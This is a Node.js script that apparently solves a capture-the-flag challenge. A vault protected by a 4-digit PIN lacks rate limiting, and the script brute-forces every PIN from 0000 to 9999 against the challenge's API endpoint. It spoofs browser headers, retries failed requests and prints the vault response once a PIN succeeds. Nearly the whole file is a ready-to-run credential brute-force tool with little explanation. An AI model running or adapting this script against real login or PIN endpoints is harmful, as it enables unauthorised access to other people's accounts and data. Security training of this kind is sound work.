/*
CHALLENGE DESCRIPTION

Welcome to the world's most vulnerable password vault - no rate limiting in sight!

This challenge presents a simple password vault protected by a 4-digit PIN. The catch? The developers forgot to implement any rate limiting whatsoever, making it the perfect target for a brute force attack.

Your mission: Write a script to systematically try all possible PINs until you find the correct one, then access the vault to retrieve the flag.

Can you automate your way through 10,000 possibilities to crack the code?
*/

const VAULT_API_URL = 'https://rate-unlimited.ac25.apisecuniversity.com/api/vault';
const MIN_PIN = 0;
const MAX_PIN = 9999;
const REQUEST_TIMEOUT_MS = 5000;
const BASE_REQUEST_DELAY_MS = 10;
const ERROR_RETRY_DELAY_MS = 3000;
const MAX_ATTEMPTS_PER_PIN = 3;

const BASE_HEADERS = {
  'Content-Type': 'application/json',
  'Sec-Ch-Ua-Platform': '"Linux"',
  'Accept-Language': 'en-GB,en;q=0.9',
  'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
  'Sec-Ch-Ua-Mobile': '?0',
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
  'Accept': '*/*',
  'Origin': 'https://rate-unlimited.ac25.apisecuniversity.com',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Dest': 'empty',
  'Referer': 'https://rate-unlimited.ac25.apisecuniversity.com/',
  'Accept-Encoding': 'gzip, deflate, br',
  'Priority': 'u=1, i',
};

const delay = ms => new Promise(res => setTimeout(res, ms));

const makeHttpRequest = async (url, method, headers = {}, body = null, timeoutMs = REQUEST_TIMEOUT_MS) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  const fetchOptions = {
    method: method,
    headers: { ...headers },
    signal: controller.signal,
  };

  if (body) {
    if (fetchOptions.headers['Content-Type'] === 'application/json' && typeof body !== 'string') {
      try {
        fetchOptions.body = JSON.stringify(body);
      } catch (e) {
        clearTimeout(timeoutId);
        return { success: false, status: null, data: null, rawText: '', headers: {}, error: `JSON stringify error: ${e.message}` };
      }
    } else {
      fetchOptions.body = body;
    }
    if (typeof fetchOptions.body === 'string' && !fetchOptions.headers['Content-Length']) {
      fetchOptions.headers['Content-Length'] = Buffer.byteLength(fetchOptions.body).toString();
    }
  }

  try {
    const response = await fetch(url, fetchOptions);
    clearTimeout(timeoutId);

    const responseHeaders = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });
    const rawText = await response.text();
    let responseData = null;

    if (responseHeaders['content-type']?.includes('application/json')) {
      try {
        responseData = JSON.parse(rawText);
      } catch (e) {}
    }

    const httpSuccess = response.status >= 200 && response.status < 300;
    return {
      success: httpSuccess,
      status: response.status,
      data: responseData,
      rawText: rawText,
      headers: responseHeaders,
      error: httpSuccess ? null : `HTTP error ${response.status}`,
    };
  } catch (error) {
    clearTimeout(timeoutId);
    const errorMessage = error.name === 'AbortError' ? `Request timed out after ${timeoutMs / 1000}s` : `Network error: ${error.message}`;
    return { success: false, status: null, data: null, rawText: '', headers: {}, error: errorMessage };
  }
};

const attemptPinVerification = async pinCode => {
  const payload = { pin: pinCode };
  return makeHttpRequest(VAULT_API_URL, 'POST', BASE_HEADERS, payload);
};

const main = async () => {
  let currentPin = MIN_PIN;
  let attemptRetriesForPin = 0;

  while (currentPin <= MAX_PIN) {
    const pinString = currentPin.toString().padStart(4, '0');

    const userMessage =
      attemptRetriesForPin > 0
        ? `Retrying PIN ${pinString} (attempt ${attemptRetriesForPin + 1}/${MAX_ATTEMPTS_PER_PIN})...\r`
        : `Trying PIN ${pinString}...\r`;
    process.stdout.write(userMessage);

    const response = await attemptPinVerification(pinString);
    let advanceToNextPin = false;
    let requestDelayMs = BASE_REQUEST_DELAY_MS;

    if (response.success && response.rawText.includes('"success":true')) {
      process.stdout.write('\n');
      console.log(`PIN ${pinString} successful! Response:`);
      console.log(response.data ? JSON.stringify(response.data) : response.rawText);
      process.exit(0);
    }

    process.stdout.write('\n');

    switch (response.status) {
      case 503:
        console.log(`PIN ${pinString}: Service unavailable (503).`);
        attemptRetriesForPin++;
        if (attemptRetriesForPin >= MAX_ATTEMPTS_PER_PIN) {
          console.log(`PIN ${pinString}: Max retries for 503. Moving to next PIN.`);
          advanceToNextPin = true;
        } else {
          console.log(`Retrying in ${ERROR_RETRY_DELAY_MS / 1000}s.`);
          requestDelayMs = ERROR_RETRY_DELAY_MS;
        }
        break;
      case null:
        console.log(`PIN ${pinString}: Request failed. Error: ${response.error}`);
        attemptRetriesForPin++;
        if (attemptRetriesForPin >= MAX_ATTEMPTS_PER_PIN) {
          console.log(`PIN ${pinString}: Max request failure retries. Moving to next PIN.`);
          advanceToNextPin = true;
        } else {
          console.log(`Retrying in ${ERROR_RETRY_DELAY_MS / 1000}s.`);
          requestDelayMs = ERROR_RETRY_DELAY_MS;
        }
        break;
      default:
        console.log(
          `PIN ${pinString}: Failed. Status: ${response.status}. Response: ${
            response.data ? JSON.stringify(response.data) : response.rawText.substring(0, 100)
          }`
        );
        advanceToNextPin = true;
        break;
    }

    if (advanceToNextPin) {
      currentPin++;
      attemptRetriesForPin = 0;
    }

    if (currentPin <= MAX_PIN) {
      await delay(requestDelayMs);
    }
  }

  process.stdout.write('\n');
  console.log(
    `All PINs from ${MIN_PIN.toString().padStart(4, '0')} to ${MAX_PIN.toString().padStart(4, '0')} attempted for ${VAULT_API_URL}. No PIN found.`
  );
  process.exit(1);
};

main().catch(error => {
  process.stdout.write('\n');
  console.error(`Unhandled application error: ${error.message}`);
  console.error(error.stack);
  process.exit(1);
});
